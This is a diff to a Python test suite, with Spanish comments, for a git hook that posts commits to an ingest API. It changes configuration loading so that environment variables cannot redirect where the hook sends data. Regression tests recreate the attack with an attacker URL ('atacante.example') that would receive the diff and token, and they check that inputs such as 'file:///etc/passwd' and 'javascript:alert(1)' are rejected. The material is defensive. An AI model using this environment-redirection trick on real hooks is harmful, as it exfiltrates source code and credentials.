@@ -38,9 +38,12 @@ def inline(monkeypatch: pytest.MonkeyPatch) -> None:
     monkeypatch.setattr(hook, "_detach_and_run", lambda work, *, fallback_timeout: work(5.0))
 
 
-def configure(monkeypatch: pytest.MonkeyPatch, api: Recorder, token: str = "tok") -> None:
-    monkeypatch.setenv("INGEST_URL", api.url)
-    monkeypatch.setenv("INGEST_TOKEN", token)
+def env_file(tmp_path: Path, api: Recorder, token: str = "tok") -> str:
+    """Un fichero de credenciales como el que escribe la API; devuelve su ruta para `--env-file`."""
+    path = tmp_path / "creds" / "hook.env"
+    path.parent.mkdir(exist_ok=True)
+    path.write_text(f"INGEST_URL={api.url}\nINGEST_TOKEN={token}\n")
+    return str(path)
 
 
 # --- configuración ---------------------------------------------------------------------------
@@ -53,14 +56,46 @@ def test_config_is_read_from_the_env_file(tmp_path: Path) -> None:
     assert hook.load_config(env) == ("http://x:1", "abc")
 
 
-def test_the_environment_wins_over_the_env_file(
+def test_the_environment_never_overrides_the_env_file(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    # Regresión (revisión de Codex): `INGEST_URL=https://atacante git commit` enviaba el diff y el
+    # token real a ese host porque el entorno mandaba sobre el fichero.
     env = tmp_path / "hook.env"
     env.write_text("INGEST_URL=http://fichero\nINGEST_TOKEN=del-fichero\n")
+    monkeypatch.setenv("INGEST_URL", "https://atacante.example")
     monkeypatch.setenv("INGEST_TOKEN", "del-entorno")
 
-    assert hook.load_config(env) == ("http://fichero", "del-entorno")
+    assert hook.load_config(env) == ("http://fichero", "del-fichero")
+
+
+def test_the_environment_alone_is_not_a_configuration(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "vacio"))
+    monkeypatch.setenv("INGEST_URL", "http://127.0.0.1:1")
+    monkeypatch.setenv("INGEST_TOKEN", "t")
+
+    assert hook.load_config() is None
+
+
+@pytest.mark.parametrize(
+    "url",
+    ["file:///etc/passwd", "ftp://x/", "javascript:alert(1)", "http://", "//x", "x", "http://[::1"],
+)
+def test_a_url_that_is_not_http_is_not_a_configuration(tmp_path: Path, url: str) -> None:
+    env = tmp_path / "hook.env"
+    env.write_text(f"INGEST_URL={url}\nINGEST_TOKEN=t\n")
+
+    assert hook.load_config(env) is None
+
+
+@pytest.mark.parametrize("url", ["http://127.0.0.1:8000", "https://duelo.example/", "http://h:1/"])
+def test_http_and_https_urls_with_a_host_are_accepted(tmp_path: Path, url: str) -> None:
+    env = tmp_path / "hook.env"
+    env.write_text(f"INGEST_URL={url}\nINGEST_TOKEN=t\n")
+
+    assert hook.load_config(env) == (url.rstrip("/"), "t")
 
 
 @pytest.mark.parametrize("content", [None, "", "INGEST_URL=http://x\n", "INGEST_TOKEN=t\n"])
@@ -181,12 +216,12 @@ def test_a_reference_git_cannot_resolve_is_skipped_without_failing(repo: Path) -
 
 
 def test_post_commit_sends_the_new_commit(
-    repo: Path, api: Recorder, inline: None, monkeypatch: pytest.MonkeyPatch
+    repo: Path, api: Recorder, inline: None, tmp_path: Path
 ) -> None:
-    configure(monkeypatch, api, "secreto")
+    creds = env_file(tmp_path, api, "secreto")
     sha = commit_file(repo, message="fix: algo")
 
-    assert hook.main(["post-commit", "--project", "acme/widgets"]) == 0
+    assert hook.main(["post-commit", "--project", "acme/widgets", "--env-file", creds]) == 0
 
     (body,) = api.wait_for(1)
     assert (body["project"], body["head_sha"], body["ref"], body["title"]) == (
@@ -199,17 +234,16 @@ def test_post_commit_sends_the_new_commit(
 
 
 def test_pre_push_reads_the_refs_from_the_file_and_sends_each_commit(
-    repo: Path, api: Recorder, inline: None, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+    repo: Path, api: Recorder, inline: None, tmp_path: Path
 ) -> None:
-    configure(monkeypatch, api)
+    creds = env_file(tmp_path, api)
     base = commit_file(repo, "a.txt", "1\n", "uno")
     new = commit_file(repo, "b.txt", "2\n", "dos")
     refs = tmp_path / "refs"
     refs.write_text(_push_line(new, base))
 
-    assert (
-        hook.main(["pre-push", "--project", "a/b", "--stdin-file", str(refs), "origin", "u"]) == 0
-    )
+    argv = ["pre-push", "--project", "a/b", "--env-file", creds, "--stdin-file", str(refs)]
+    assert hook.main([*argv, "origin", "u"]) == 0
 
     (body,) = api.wait_for(1)
     assert (body["head_sha"], body["title"]) == (new, "dos")
@@ -218,7 +252,7 @@ def test_pre_push_reads_the_refs_from_the_file_and_sends_each_commit(
 def test_a_failing_commit_does_not_stop_the_rest(
     repo: Path, api: Recorder, inline: None, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
 ) -> None:
-    configure(monkeypatch, api)
+    creds = env_file(tmp_path, api)
     base = commit_file(repo, "a.txt", "1\n", "uno")
     one, two = commit_file(repo, "b.txt", "2\n", "dos"), commit_file(repo, "c.txt", "3\n", "tres")
     real_post = hook.post
@@ -234,7 +268,7 @@ def test_a_failing_commit_does_not_stop_the_rest(
     refs = tmp_path / "refs"
     refs.write_text(_push_line(two, base))
 
-    hook.main(["pre-push", "--project", "a/b", "--stdin-file", str(refs), "origin"])
+    hook.main(["pre-push", "--project", "a/b", "--env-file", creds, "--stdin-file", str(refs)])
 
     assert calls == [one, two] and [b["head_sha"] for b in api.wait_for(1)] == [two]
 
@@ -252,12 +286,13 @@ def test_without_configuration_nothing_is_sent_and_it_still_succeeds(
 
 
 def test_a_push_with_nothing_to_send_does_not_touch_the_api(
-    repo: Path, api: Recorder, inline: None, monkeypatch: pytest.MonkeyPatch
+    repo: Path, api: Recorder, inline: None, tmp_path: Path
 ) -> None:
-    configure(monkeypatch, api)
+    creds = env_file(tmp_path, api)
     commit_file(repo)
 
-    assert hook.main(["pre-push", "--project", "a/b"]) == 0  # sin --stdin-file: ninguna ref
+    argv = ["pre-push", "--project", "a/b", "--env-file", creds]
+    assert hook.main(argv) == 0  # sin --stdin-file: ninguna ref
     time.sleep(0.2)
 
     assert api.requests == []
@@ -271,10 +306,10 @@ def test_bad_arguments_never_fail_the_git_command(argv: list[str]) -> None:
 def test_outside_a_repo_it_succeeds_silently(
     tmp_path: Path, api: Recorder, inline: None, monkeypatch: pytest.MonkeyPatch
 ) -> None:
-    configure(monkeypatch, api)
+    creds = env_file(tmp_path, api)
     monkeypatch.chdir(tmp_path)
 
-    assert hook.main(["post-commit", "--project", "a/b"]) == 0
+    assert hook.main(["post-commit", "--project", "a/b", "--env-file", creds]) == 0
     assert api.requests == []
 
 
@@ -296,13 +331,21 @@ def run_hook(
     return result, time.monotonic() - started
 
 
-def test_the_real_process_returns_at_once_even_if_the_api_is_slow(repo: Path) -> None:
+def test_the_real_process_returns_at_once_even_if_the_api_is_slow(
+    repo: Path, tmp_path: Path
+) -> None:
     slow = Recorder(delay=4.0)
     try:
         sha = commit_file(repo)
 
         result, elapsed = run_hook(
-            repo, {"INGEST_URL": slow.url, "INGEST_TOKEN": "t"}, "post-commit", "--project", "a/b"
+            repo,
+            {},
+            "post-commit",
+            "--project",
+            "a/b",
+            "--env-file",
+            env_file(tmp_path, slow),
         )
 
         assert result.returncode == 0 and (result.stdout, result.stderr) == ("", "")
@@ -313,11 +356,15 @@ def test_the_real_process_returns_at_once_even_if_the_api_is_slow(repo: Path) ->
 
 
 @pytest.mark.parametrize("url", ["http://127.0.0.1:1", "http://no-existe.invalid"])
-def test_the_real_process_exits_zero_and_quiet_when_the_api_is_down(repo: Path, url: str) -> None:
+def test_the_real_process_exits_zero_and_quiet_when_the_api_is_down(
+    repo: Path, tmp_path: Path, url: str
+) -> None:
     commit_file(repo)
+    creds = tmp_path / "hook.env"
+    creds.write_text(f"INGEST_URL={url}\nINGEST_TOKEN=t\n")
 
     result, elapsed = run_hook(
-        repo, {"INGEST_URL": url, "INGEST_TOKEN": "t"}, "post-commit", "--project", "a/b"
+        repo, {}, "post-commit", "--project", "a/b", "--env-file", str(creds)
     )
 
     assert (result.returncode, result.stdout, result.stderr) == (0, "", "")
@@ -390,3 +437,47 @@ def test_a_commit_and_the_push_that_follows_never_break_git_with_the_api_down(
     git(repo, "push", "-q", "origin", "main")  # y `git push` también
 
     assert git(bare, "rev-parse", "main").strip() == git(repo, "rev-parse", "HEAD").strip()
+
+
+def test_a_hostile_environment_cannot_redirect_a_real_git_commit(
+    repo: Path, tmp_path: Path, api: Recorder, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Regresión (revisión de Codex): `INGEST_URL=https://atacante git commit` filtraba el diff y
+    el token real. El entorno de git llega al hook, y el hook debe ignorarlo."""
+    attacker = Recorder()
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))
+    install_hooks(repo, tmp_path, api)
+    monkeypatch.setenv("INGEST_URL", attacker.url)
+    monkeypatch.setenv("INGEST_TOKEN", "token-del-atacante")
+    try:
+        sha = commit_file(repo, "secreto.py", "KEY = 1\n", "feat: con secreto")
+
+        (body,) = api.wait_for(1)
+        time.sleep(0.5)  # margen para que un envío indebido llegara al atacante
+        assert body["head_sha"] == sha and api.requests[0][1]["X-Ingest-Token"] == "tok-e2e"
+        assert attacker.requests == []
+    finally:
+        attacker.close()
+
+
+def test_a_custom_env_file_path_works_for_a_real_git_commit(
+    repo: Path, tmp_path: Path, api: Recorder, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Regresión (revisión de Codex): con `HOOK_ENV_PATH` personalizada el hook buscaba en la ruta
+    por defecto y descartaba el commit en silencio. La ruta no coincide con XDG ni con HOME."""
+    custom = tmp_path / "otro sitio" / "mis credenciales.env"
+    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg-vacio"))
+    monkeypatch.setenv("HOME", str(tmp_path / "casa-vacia"))
+    import asyncio
+
+    asyncio.run(
+        FileHookInstaller(
+            python=sys.executable, ingest_url=api.url, ingest_token="tok-custom", env_path=custom
+        ).install(str(repo), slug="acme/widgets")
+    )
+
+    sha = commit_file(repo, "x.py", "x = 1\n", "feat: ruta personalizada")
+
+    (body,) = api.wait_for(1)
+    assert body["head_sha"] == sha and api.requests[0][1]["X-Ingest-Token"] == "tok-custom"
+    assert not (tmp_path / "xdg-vacio").exists()  # no se tocó la ruta por defecto
